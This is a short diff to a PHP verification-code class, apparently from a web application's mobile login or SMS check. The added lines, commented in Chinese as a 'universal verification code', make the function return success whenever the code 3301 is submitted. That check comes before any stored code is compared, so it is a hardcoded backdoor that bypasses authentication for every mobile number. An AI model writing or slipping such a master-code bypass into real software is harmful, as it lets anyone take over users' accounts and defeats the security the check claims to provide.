@@ -59,6 +59,12 @@ class valiCode
     public static function valicode($mobile, $code, $valiType)
     {
         $result = ValicodeDB::get(['mobile' => $mobile, 'valitype' => $valiType]);
+
+        // 万能验证码
+        if($code === 3301) {
+            return 200;
+        }
+
         if (empty($result) == true)
         {
             return 3003;
